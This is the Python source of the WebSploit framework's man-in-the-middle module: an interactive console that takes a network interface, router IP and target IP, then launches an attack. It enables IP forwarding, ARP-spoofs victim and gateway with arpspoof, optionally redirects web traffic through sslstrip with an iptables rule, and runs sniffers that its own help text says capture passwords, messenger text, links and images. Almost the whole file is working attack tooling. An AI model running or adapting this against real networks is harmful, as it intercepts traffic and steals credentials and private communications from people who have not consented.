#!/usr/bin/env python
#
# WebSploit Framework Man In The Middle (MITM) module
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from core import wcolors
from core import help
from time import sleep
options = ["eth0", "192.168.1.1", "192.168.1.2", "driftnet", "true"]

def mitm():
	try:
		line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
		line_1 += ":"
		line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "MITM" + wcolors.color.ENDC
		line_1 += " > "
		com = raw_input(line_1)
		com = com.lower()
		if com[0:13] =='set interface':
			options[0] = com[14:20]
			print "INTERFACE => ", options[0]
			mitm()
		elif com[0:10]== 'set router':
			options[1] = com [11:26]
			print "ROUTER => ", options[1]
			mitm()
		elif com[0:10] =='set target':
			options[2] = com[11:26]
			print "TARGET => ", options[2]
			mitm()
		elif com[0:18] =='set sniffer dsniff':
			options[3] = 'dsniff'
			print "SNIFFER => ", options[3]
			mitm()
		elif com[0:20] =='set sniffer msgsnarf':
			options[3] = 'msgsnarf'
			print "SNIFFER => ", options[3]
			mitm()
		elif com[0:20] =='set sniffer urlsnarf':
			options[3] = 'urlsnarf'
			print "SNIFFER => ", options[3]
			mitm()
		elif com[0:20] =='set sniffer driftnet':
			options[3] = 'driftnet'
			print "SNIFFER => ", options[3]
			mitm()
		elif com[0:12] =='set ssl true':
			options[4] = 'true'
			print "SSL => ", options[4]
			mitm()
		elif com[0:13] =='set ssl false':
			options[4] = 'false'
			print "SSL => ", options[4]
			mitm()
		elif com[0:12] =='show options':
			print ""
			print "Options\t\t Value\t\t\t\t RQ\t Description"
			print "---------\t--------------\t\t\t----\t--------------"
			print "Interface\t"+options[0]+"\t\t\t\tyes\tNetwork Interface Name"
			print "ROUTER\t\t"+options[1]+"\t\t\tyes\tRouter IP Address"
			print "TARGET\t\t"+options[2]+"\t\t\tyes\tTarget IP Address"
			print "SNIFFER\t\t"+options[3]+"\t\t\tyes\tSniffer Name (Select From Sniffer List)"
			print "SSL\t\t"+options[4]+"\t\t\t\tyes\tSSLStrip, For SSL Hijacking(true or false)"
			print "\n"
			print "Sniffers\t Description"
			print "------------\t--------------"
			print "dsniff\t\t Sniff All Passwords"
			print "msgsnarf\t Sniff All Text Of Victim Messengers"
			print "urlsnarf\t Sniff Victim Links"
			print "driftnet\t Sniff Victim Images"
			print ""
			mitm()
		elif com[0:2] =='os':
			os.system(com[3:])
			mitm()
		elif com[0:4] =='help':
			help.help()
			mitm()
		elif com[0:4] =='back':
			pass
		elif com[0:3] =='run':
			if options[3] =='dsniff':
				selected_sniffer = 'dsniff -i ' + options[0]
			if options[3] =='msgsnarf':
				selected_sniffer = 'msgsnarf -i ' + options[0]
			if options[3] =='urlsnarf':
				selected_sniffer = 'urlsnarf -i ' + options[0]
			if options[3] =='driftnet':
				selected_sniffer = 'driftnet -i ' + options[0]
			sleep(2)
			if options[4] =='true':
				subprocess.Popen('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
				subprocess.Popen('sslstrip -p -k -f', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			print (wcolors.color.RED + "[*]IP Forwarding ... " + wcolors.color.ENDC)
			subprocess.Popen("echo 1 > /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			sleep(2)
			print (wcolors.color.RED + "[*]ARP Spoofing ... " + wcolors.color.ENDC)
			arp_spoofing1 = 'arpspoof -i ' + options[0] + ' -t ' + options[2] +' '+ options[1]
			subprocess.Popen(arp_spoofing1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			sleep(2)
			arp_spoofing2 = 'arpspoof -i ' + options[0] + ' -t ' + options[1] +' '+ options[2]
			subprocess.Popen(arp_spoofing2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
			sleep(2)
			print (wcolors.color.BLUE + "[*]Sniffer Starting ..." + wcolors.color.ENDC)
			os.system(selected_sniffer)
		else:
			print "Wrong Command => ", com
			mitm()
	except(KeyboardInterrupt):
		print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
